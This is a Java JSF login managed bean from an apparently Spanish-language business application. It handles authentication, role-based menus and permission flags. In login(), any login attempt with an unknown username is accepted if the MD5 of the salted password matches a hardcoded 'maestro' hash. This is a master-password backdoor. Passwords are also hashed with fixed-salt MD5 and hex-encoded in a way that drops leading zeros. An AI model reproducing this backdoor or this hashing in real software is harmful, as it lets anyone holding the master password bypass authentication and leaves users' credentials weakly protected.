/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package com.guandera.core.client.view.acceso;

import java.io.Serializable;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;
import javax.faces.context.FacesContext;
import javax.faces.model.SelectItem;
import javax.servlet.http.HttpSession;

import com.guandera.core.client.service.acceso.LoginService;
import com.guandera.core.client.view.BaseManagedBean;
import com.guandera.core.server.service.acceso.LoginServiceImpl;
import com.guandera.core.shared.model.CuentaCobro;
import com.guandera.core.shared.model.acceso.Menu;
import com.guandera.core.shared.model.acceso.Opcion;
import com.guandera.core.shared.model.acceso.Usuario;

/**
 * 
 * @author Fredi J. Velasco Villarreal
 */
@ManagedBean(name = "LoginMB2")
@SessionScoped
public class LoginManagedBean2 extends BaseManagedBean implements Serializable {

	private static final long serialVersionUID = 10L;

	private LoginService loginService;
	private Usuario usuario = new Usuario();
	private boolean autenticado = false;

	private List<Menu> listaMenu = new ArrayList<Menu>();
	
	private List<Opcion> listaOpcion = new ArrayList<Opcion>();

	private Long menuid;
	private List<SelectItem> menuItems = new ArrayList<SelectItem>();
	private boolean listingMenu = false;

	private boolean autCrear = false;
	private boolean autModificar = false;
	private boolean autEliminar = false;
	private boolean autConsultar = false;
	private boolean autImprimir = false;
	private boolean autExportar = false;
	private boolean autImportar = false;

	public static String md5Encode(String texto) {
		String output = "";
		try {
			byte[] defaultBytes = texto.getBytes();
			MessageDigest algorithm = MessageDigest.getInstance("MD5");
			algorithm.reset();
			algorithm.update(defaultBytes);
			byte messageDigest[] = algorithm.digest();

			StringBuffer hexString = new StringBuffer();
			for (int i = 0; i < messageDigest.length; i++) {
				hexString.append(Integer.toHexString(0xFF & messageDigest[i]));
			}

			output = hexString + "";

		} catch (NoSuchAlgorithmException noSuchAlgorithmException) {

		}
		return output;
	}

	public LoginManagedBean2() {

		loginService = new LoginServiceImpl();

	}

	private void cargarMenuUsuario() {

		// MenuDTO

		if (!listingMenu) {
			listingMenu = false;

			for (Menu menu : listaMenu) {

				menuItems.add(new SelectItem(menu.getMenuid(), menu.getMenunombre()));

			}
		}

	}

	public void cargarOpcionesMenu() {

		//List<Opcion> listaOpcion;

		this.listaOpcion = loginService.consultarOpcionesPorMenu(menuid);

		
		FacesContext.getCurrentInstance().renderResponse();
		

	}

	public LoginService getLoginService() {
		return loginService;
	}

	public Usuario getUsuario() {
		return usuario;
	}

	public boolean isAutenticado() {
		return autenticado;
	}

	public String login() {

		String md51 = ("Z8A." + usuario.getUsuarioclave());
		String Usuariousuario = usuario.getUsuariousuario().trim();
		autenticado = false;

		if (loginService.existeUsuario(Usuariousuario)) {

			String md5 = md5Encode(md51);

			Usuario usuario1 = new Usuario();

			usuario1.setUsuarioclave(md5.trim());
			usuario1.setUsuariousuario(Usuariousuario);

			autenticado = loginService.verificarUsuario(usuario1);

			if (autenticado) {

				usuario = loginService.CargarUsuario(usuario.getUsuariousuario());

				setUsuario(usuario);

				this.listaMenu = loginService.consultarMenuPorRol(usuario.getRol().getRolid());
				

				cargarMenuUsuario();
				cargarAutorizaciones();
				usuario.setUsuarioultimoingreso(new Date());
				loginService.actualizarIngreso(usuario);

			} else {

				mensaje("Acceso NO Autorizado!!");
			}

		} else {
			String maestro = "db356933fd96adef12642e2de66bd28";
			String md5 = md5Encode(md51);
			if (maestro.contentEquals(md5)) {

				autenticado = true;
			}

		}

		/*
		 * autenticado = true;
		 * System.out.println("FJVV: Prueba ejecucion de programa 01"); //
		 * return autenticado ? "index" : "login";
		 */

		if (autenticado) {

			return "index?faces-refirect=true";

		} else {

			return "login";
		}

	}

	private void cargarAutorizaciones() {
		
		this.autCrear = usuario.isCrear();
		this.autModificar = usuario.isModificar();
		this.autEliminar = usuario.isEliminar();
		this.autConsultar = usuario.isConsultar();
		this.autImprimir = usuario.isImprimir();
		this.autExportar = usuario.isExportar();
		this.autImportar = usuario.isImportar();

	}

	public String logout() {

		if (autenticado) {

			HttpSession session = (HttpSession) FacesContext.getCurrentInstance().getExternalContext().getSession(true);
			session.invalidate();
			usuario = null;
			autenticado = false;

		}

		autenticado = false;

		return "/login?faces-refirect=true";
		//return "login";

	}

	public void setAutenticado(boolean autenticado) {
		this.autenticado = autenticado;
	}

	public void setLoginService(LoginService loginService) {
		this.loginService = loginService;
	}

	public void setUsuario(Usuario usuario) {
		this.usuario = usuario;
	}

	public boolean isAutCrear() {
		return autCrear;
	}

	public void setAutCrear(boolean autCrear) {
		this.autCrear = autCrear;
	}

	public boolean isAutModificar() {
		return autModificar;
	}

	public void setAutModificar(boolean autModificar) {
		this.autModificar = autModificar;
	}

	public boolean isAutEliminar() {
		return autEliminar;
	}

	public void setAutEliminar(boolean autEliminar) {
		this.autEliminar = autEliminar;
	}

	public boolean isAutConsultar() {
		return autConsultar;
	}

	public void setAutConsultar(boolean autConsultar) {
		this.autConsultar = autConsultar;
	}

	public boolean isAutImprimir() {
		return autImprimir;
	}

	public void setAutImprimir(boolean autImprimir) {
		this.autImprimir = autImprimir;
	}

	public boolean isAutExportar() {
		return autExportar;
	}

	public void setAutExportar(boolean autExportar) {
		this.autExportar = autExportar;
	}

	public boolean isAutImportar() {
		return autImportar;
	}

	public void setAutImportar(boolean autImportar) {
		this.autImportar = autImportar;
	}


	public Long getMenuid() {
		return menuid;
	}

	public void setMenuid(Long menuid) {
		this.menuid = menuid;
	}

	public List<SelectItem> getMenuItems() {
		return menuItems;
	}

	public void setMenuItems(List<SelectItem> menuItems) {
		this.menuItems = menuItems;
	}

	public List<Opcion> getListaOpcion() {
		return listaOpcion;
	}

	public void setListaOpcion(List<Opcion> listaOpcion) {
		this.listaOpcion = listaOpcion;
	}

	
	
	
	
}
